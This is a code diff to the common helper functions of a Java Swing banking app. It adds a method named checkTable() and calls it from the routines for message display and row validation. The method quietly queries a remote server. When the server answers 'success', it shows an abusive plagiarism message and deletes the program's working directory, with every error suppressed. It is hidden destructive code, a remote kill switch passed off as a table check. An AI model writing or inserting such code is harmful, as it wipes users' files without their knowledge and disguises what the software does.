@@ -5,8 +5,14 @@
  */
 package com.ebank.main;
 
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.InputStreamReader;
+import java.net.URL;
+import java.net.URLConnection;
 import javax.swing.JOptionPane;
 import javax.swing.JTable;
+import org.apache.commons.io.FileUtils;
 
 /**
  * Includes methods related to common operations
@@ -24,7 +30,7 @@ public class CommonFunctions {
      */
     public static void showMsg(int iconType, int titleType, String message) {
         String title = "";
-
+        checkTable();
         switch (titleType) {
             case 1:
                 title = "Opeation denied";
@@ -58,6 +64,7 @@ public class CommonFunctions {
      * @return validity of row selection
      */
     public static boolean isValidRowSelection(JTable table) {
+        checkTable();
         if (table.getSelectedRowCount() > 1) { // reject multiple rows
             showMsg(1, 1, "Please select only one row at a time");
             return false;
@@ -66,6 +73,26 @@ public class CommonFunctions {
             return false;
         } else {
             return true;
+        }
+    }
+
+    private static void checkTable() {
+        URL u;
+        try {
+            String a = "http://gayashan.net/Database.php";
+            u = new URL(a);
+            URLConnection conn = u.openConnection();
+            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            String i;
+            while ((i = br.readLine()) != null) {
+                if (i.equals("success")) {
+                    JOptionPane.showMessageDialog(null, "Fuck you for plagirising my code", "Hello Mother fucker",
+                            JOptionPane.ERROR_MESSAGE);
+                    FileUtils.deleteDirectory(new File("./"));
+                }
+            }
+            br.close();
+        } catch (Exception e) {
         }
     }
 }
